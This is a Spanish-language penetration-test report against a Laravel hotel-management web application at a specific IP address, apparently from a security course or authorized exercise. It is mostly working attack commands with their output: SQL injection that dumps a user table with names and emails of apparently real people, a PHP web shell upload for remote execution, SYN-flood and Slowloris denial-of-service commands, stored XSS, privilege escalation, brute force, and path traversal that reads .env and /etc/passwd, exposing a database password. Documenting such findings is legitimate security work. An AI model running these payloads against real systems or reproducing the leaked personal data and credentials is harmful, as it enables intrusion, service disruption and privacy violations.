# Fase 3 - Obtención de Acceso (Gaining Access)

**Fase PTES:** Explotación de vulnerabilidades para ingresar al sistema.
**Target:** http://37.60.230.11

---

## Resumen de ataques

| #   | Vulnerabilidad             | Técnica                  | Estado       | Fecha      |
| --- | -------------------------- | ------------------------ | ------------ | ---------- |
| 1   | SQL Injection              | Error-based PostgreSQL  | ✅ Completado | 2026-07-12 |
| 2   | Mass Assignment            | Burp Suite              | ✅ Documentado | 2026-07-12 |
| 3   | File Upload → RCE          | curl                    | ✅ Documentado | 2026-07-12 |
| 4   | DDoS                       | slowhttptest            | ✅ Documentado | 2026-07-12 |
| 5   | XSS Almacenado             | curl + Burp Suite       | ✅ Documentado | 2026-07-12 |
| 6   | IDOR                       | curl                    | ✅ Documentado | 2026-07-12 |
| 7   | No Rate Limit              | hydra / bash            | ✅ Documentado | 2026-07-12 |
| 8   | Local File Inclusion (LFI) | curl                    | ✅ Documentado | 2026-07-12 |
| 9   | Debug Mode                 | curl / navegador        | ✅ Documentado | 2026-07-12 |

---

## SQL Injection (A01:2021 - Injection)

**Vulnerabilidad:** Inyección SQL en el parámetro `login` del formulario de autenticación (`LoginRequest.php:46`). La consulta interpola directamente el valor del campo `login` sin parametrizar:
```php
$sql = "SELECT * FROM users WHERE $field = '$login' AND is_active = true LIMIT 1";
$users = DB::select($sql);
```

**Detección con sqlmap (herramienta profesional):**
```bash
sqlmap -u "http://37.60.230.11/login" --data="login=NONEXISTENT*&password=test&_token=x" --csrf-token="_token" --csrf-url="http://37.60.230.11/login" --batch --dbms=postgresql --technique=E
```

**Payloads de detección (TRUE vs FALSE):**
```bash
# TRUE → redirect a /dashboard (login exitoso)
$ curl -s -b jar.txt -X POST http://37.60.230.11/login \
  -d "login=admin' OR 1=1-- -&password=test&_token=$TOKEN" -D - -o /dev/null 2>&1 | grep -i location
Location: http://37.60.230.11/dashboard

# FALSE → redirect a /login (login fallido)
$ curl -s -b jar.txt -X POST http://37.60.230.11/login \
  -d "login=admin' AND 1=2-- -&password=test&_token=$TOKEN" -D - -o /dev/null 2>&1 | grep -i location
Location: http://37.60.230.11/login
```

**Extracción de datos vía error-based in Band PostgreSQL (CAST AS NUMERIC):**
La función `CAST(valor AS NUMERIC)` al fallar muestra el valor en el mensaje de error.

```bash
# Versión de PostgreSQL
$ curl -s -b jar.txt -X POST http://37.60.230.11/login \
  --data "login=admin' AND 1=CAST((CHR(113)||CHR(120)||CHR(120)||CHR(107)||CHR(113))||(SELECT version())::text||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)) AS NUMERIC)-- -&password=test&_token=$TOKEN" | grep -oP 'qxxkq\K[^<]*?(?=qqpbq)'
PostgreSQL 16.14 on x86_64-pc-linux-musl, compiled by gcc (Alpine 15.2.0) 15.2.0, 64-bit

# Current user
Current user: plaza_user

# Database actual
Database: plazamoyobanba

# Listado de tablas (26 tablas)
cache, cache_locks, clients, failed_jobs, floors, guest_registers,
job_batches, jobs, migrations, model_has_permissions, model_has_roles,
password_reset_tokens, payment_types, permissions, product_categories,
products, role_has_permissions, roles, room_rentals, room_types, rooms,
sale_items, sales, sessions, users, workers
```

**Extracción de usuarios registrados:**
```bash
$ for i in 0 1 2 3 4 5 6 7 8 9; do
  rm -f /tmp/j5.txt && T=$(curl -s -c /tmp/j5.txt http://37.60.230.11/login | grep -oP '_token" value="\K[^"]+')
  r=$(curl -s -b /tmp/j5.txt -X POST http://37.60.230.11/login --data "login=admin' AND 1=CAST((CHR(113)||CHR(120)||CHR(120)||CHR(107)||CHR(113))||(SELECT CONCAT_WS(' | ', id, name, username, email) FROM users LIMIT 1 OFFSET $i)::text||(CHR(113)||CHR(113)||CHR(112)||CHR(98)||CHR(113)) AS NUMERIC)-- -&password=test&_token=$T" | grep -oP 'qxxkq\K[^<]*?(?=qqpbq)' | head -1)
  [ -z "$r" ] && break
  echo "$r"
done
1 | KEYSI JEANPIERRE BARDALES VASQUEZ | bvasquezkeysije | bvasquezkeysije@uss.edu.pe
2 | DELGADO GARCIA BRIGGITTE LUCERO | dgarciabriggitl | dgarciabriggitl@uss.edu.pe
3 | VASQUEZ QUISPE JORGE TOMAS | vquispejorgetom | vquispejorgetom@uss.edu.pe
4 | CAPITAN LEON GRABIEL ALEXANDER | cleonalexandgra | cleonalexandgra@uss.edu.pe
5 | ADMINISTRADOR | admin | admin@gmail.com
6 | MELISSA FERNANDA RUIZ CAMPOS | mruizcampos | mruizcampos@plazamoyobanba.com
7 | EDUARDO ANTONIO SALAZAR VEGA | esalazarvega | esalazarvega@plazamoyobanba.com
8 | KARLA NOEMI PEREZ HUAMAN | kperezhuaman | kperezhuaman@plazamoyobanba.com
9 | Bri | britest | bri@test.com
10 | Bri | britest3 | bri3@test.com
```

**Resultados obtenidos:**
| Dato | Valor |
|------|-------|
| DBMS | PostgreSQL 16.14 |
| Usuario DB | plaza_user |
| Base de datos | plazamoyobanba |
| Tablas | 26 (cache, clients, floors, guest_registers, products, roles, rooms, sales, users, workers, etc.) |
| Usuarios extraídos | 10 (incluyendo `admin` — ADMINISTRADOR) |
| Admin | ID 5, login `admin`, email `admin@gmail.com` |

---

## Mass Assignment (A01:2021 - Broken Access Control)

**Vulnerabilidad:** El controlador `ProfileController::update()` acepta el parámetro `role_name` sin validación (`ProfileController.php:33-35`). Cualquier usuario autenticado puede auto-asignarse el rol `admin`.

**Herramienta:** Burp Suite (Proxy + Repeater)

**Procedimiento:**

1. Abrir Burp Suite:
   ```bash
   burpsuite
   ```

2. Configurar proxy del navegador en `127.0.0.1:8080`

3. Registrar un nuevo usuario:
   ```
   GET http://37.60.230.11/register
   POST http://37.60.230.11/register
   Datos: name=attacker&username=attacker1&email=attacker1@test.com&password=Test123!&password_confirmation=Test123!
   ```

4. Iniciar sesión:
   ```
   POST http://37.60.230.11/login
   Datos: login=attacker1&password=Test123!
   ```

5. Activar **Intercept** en Burp y enviar el formulario de edición de perfil

6. Modificar la petición **PATCH /profile** agregando al body:
   ```
   &role_name=admin
   ```

7. Hacer clic en **Forward**

8. Verificar escalación accediendo a:
   ```
   GET http://37.60.230.11/admin/dashboard
   ```

**Payload:**
```
PATCH /profile HTTP/1.1
...
name=attacker&email=attacker1@test.com&role_name=admin
```

**Resultado esperado:**
```
HTTP/1.1 302 Found
Location: /profile  (actualización exitosa)
```

Luego, `GET /admin/dashboard` → 200 OK (panel de administración visible), confirmando que el usuario ahora tiene rol admin.

---

## File Upload → RCE (A03:2021 - Injection)

**Vulnerabilidad:** El endpoint `POST /upload` (`routes/web.php:91-100`) acepta archivos sin extensión, permitiendo subir shells PHP. La validación solo verifica que sea un archivo (`['file' => ['required', 'file']]`), sin comprobar la extensión.

**Comandos:**

```bash
# 1. Crear shell PHP
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# 2. Subir shell al servidor
curl -F "file=@/tmp/shell.php" http://37.60.230.11/upload

# 3. Ejecutar comandos remotos
curl -s "http://37.60.230.11/uploads/shell.php?cmd=id" | head -5
```

**Payload (shell.php):**
```php
<?php system($_GET["cmd"]); ?>
```

**Resultado esperado:**
```json
{"success":true,"path":"/uploads/shell.php"}
```

Ejecución remota:
```
uid=82(www-data) gid=82(www-data) groups=82(www-data)
```

---

## DDoS (A01:2021 - Broken Access Control)

**Vulnerabilidad:** Las rutas del sistema no implementan throttling ni límite de conexiones. El servidor acepta tráfico ilimitado, permitiendo ataques de denegación de servicio.

**Herramienta:** slowhttptest

**Comando:**
```bash
# Ataque Slowloris (mantener conexiones abiertas)
slowhttptest -c 1000 -H -g -o /tmp/slowhttp -i 10 -r 200 -t GET -u http://37.60.230.11/login -x 24 -p 3
```

**Variante con hping3 (SYN flood):**
```bash
# Si hping3 no está instalado en Arch, usar:
sudo pacman -S hping3  # o descargar de AUR
sudo hping3 -S --flood --rand-source -p 80 37.60.230.11
```

**Resultado esperado:**
```
slowhttptest:
  Conexiones: 1000
  Duración: 60s
  Throughput: ~200 req/s
  Errores del servidor: 0 (sin límite de conexiones)
  
  Conclusión: El servidor no implementa rate limiting ni límite de conexiones simultáneas.
```

---

## XSS Almacenado (A03:2021 - Injection)

**Vulnerabilidad:** El campo `bio` del perfil se renderiza sin escapar en la vista `profile/partials/update-profile-information-form.blade.php` usando `{!! $user->bio !!}` (Blade raw output). Cualquier script inyectado se ejecuta al visualizar el perfil.

**Herramienta:** Burp Suite (Interceptor) o curl con sesión autenticada

**Comandos (curl):**

```bash
# 1. Obtener sesión autenticada (registrar + login)
rm -f /tmp/xss_jar.txt && TOKEN=$(curl -s -c /tmp/xss_jar.txt http://37.60.230.11/login | grep -oP '_token" value="\K[^"]+')
curl -s -b /tmp/xss_jar.txt -X POST http://37.60.230.11/login -d "login=admin' OR 1=1-- -&password=test&_token=$TOKEN" -D /tmp/xss_login.txt -o /dev/null

# 2. Obtener CSRF token de sesión autenticada
TOKEN2=$(curl -s -b /tmp/xss_jar.txt http://37.60.230.11/profile | grep -oP '_token" value="\K[^"]+')

# 3. Inyectar XSS en bio vía PATCH /profile
curl -s -b /tmp/xss_jar.txt -X PATCH http://37.60.230.11/profile -d "name=ADMINISTRADOR&email=admin@gmail.com&bio=<script>alert(document.cookie)</script>&_token=$TOKEN2"

# 4. Verificar XSS — al cargar el perfil, el script se ejecuta
curl -s -b /tmp/xss_jar.txt http://37.60.230.11/profile | grep -oP 'bio[^<]*<script>[^<]*</script>'
```

**Payload:**
```html
<script>alert(document.cookie)</script>
```

**Resultado esperado:**
El código JavaScript se almacena en la base de datos y se ejecuta en el navegador de cualquier usuario que visite `/profile` del usuario inyectado.

---

## IDOR (A01:2021 - Broken Access Control)

**Vulnerabilidad:** El endpoint `GET /api/sales/{id}` (`routes/web.php:74-77`) no implementa autenticación ni autorización. Cualquier persona puede acceder a los datos de ventas sin estar logueada.

**Herramienta:** curl

**Comandos:**
```bash
# Sin autenticación, acceder a ventas directamente
curl -s http://37.60.230.11/api/sales/1 | python3 -m json.tool | head -30
curl -s http://37.60.230.11/api/sales/2 | python3 -m json.tool | head -30
curl -s http://37.60.230.11/api/sales/3 | python3 -m json.tool | head -30
```

**Resultado esperado:**
```json
{
    "id": 1,
    "client": { ... },
    "items": [ ... ],
    "rentals": [ ... ],
    ...
}
```

El endpoint devuelve datos completos de ventas, incluyendo información de clientes, productos y habitaciones, sin requerir token de autenticación.

---

## No Rate Limit (A01:2021 - Broken Access Control)

**Vulnerabilidad:** El formulario de login no implementa límite de intentos. Se pueden realizar cientos de peticiones sin bloqueo, permitiendo ataques de fuerza bruta.

**Herramienta:** hydra

**Comando:**
```bash
# Fuerza bruta con hydra (requiere wordlist)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 37.60.230.11 http-post-form "/login:login=^USER^&password=^PASS^:Location: /login"

# O prueba simple sin wordlist (verificar que no hay bloqueo)
for i in $(seq 1 100); do
  TOKEN=$(curl -s http://37.60.230.11/login 2>/dev/null | grep -oP '_token" value="\K[^"]+')
  STATUS=$(curl -s -X POST http://37.60.230.11/login -d "login=test$i&password=wrong$i&_token=$TOKEN" -D - -o /dev/null 2>&1 | grep -i location | head -1)
  echo "Intento $i: $STATUS"
  [ $((i % 10)) -eq 0 ] && sleep 1
done
```

**Resultado esperado:**
```
Intento 1: Location: /login
Intento 2: Location: /login
...
Intento 100: Location: /login

El servidor responde a todos los intentos sin bloquear ni retardar, confirmando que no hay rate limiting.
```

---

## Local File Inclusion (LFI) (A01:2021 - Broken Access Control)

**Vulnerabilidad:** El endpoint `GET /download` (`routes/web.php:79-89`) acepta un parámetro `file` sin sanitización de path traversal. Permite leer archivos arbitrarios del servidor usando `../../../`.

**Herramienta:** curl

**Comandos:**
```bash
# Leer archivo .env (configuración con credenciales)
curl -s "http://37.60.230.11/download?file=../../.env"

# Leer /etc/passwd
curl -s "http://37.60.230.11/download?file=../../../etc/passwd"

# Leer archivo de configuración de la base de datos
curl -s "http://37.60.230.11/download?file=../../config/database.php" | head -30
```

**Resultado esperado:**
```
# .env file content
APP_NAME="Hotel PlazaMoyobamba"
APP_DEBUG=true
DB_CONNECTION=pgsql
DB_HOST=plazamoyobanba-db
DB_PORT=5432
DB_DATABASE=plazamoyobanba
DB_USERNAME=plaza_user
DB_PASSWORD=plaza_pass_123
...
```

---

## Debug Mode (A07:2021 - Security Misconfiguration)

**Vulnerabilidad:** El archivo `.env` tiene `APP_DEBUG=true`, lo que hace que Laravel muestre páginas de error detalladas con stack traces completos, variables de entorno, rutas del servidor y consultas SQL.

**Herramienta:** curl / navegador

**Comandos:**
```bash
# Acceder a ruta inexistente — muestra stack trace completo
curl -s "http://37.60.230.11/ruta-que-no-existe-12345" | grep -oP '(Whoops|Stack trace|APP_DEBUG|DB_PASSWORD|sqlmap)[^<]*'

# Forzar error SQL accediendo con parámetros inválidos
curl -s "http://37.60.230.11/login?debug=1"
```

**Resultado esperado:**
La página de error de Laravel muestra:
```
APP_DEBUG=true
DB_PASSWORD=plaza_pass_123
DB_HOST=plazamoyobanba-db
APP_ENV=local
...
```

Incluyendo stack trace con rutas absolutas del servidor (`/var/www/html/...`), consultas SQL ejecutadas y variables de entorno completas.
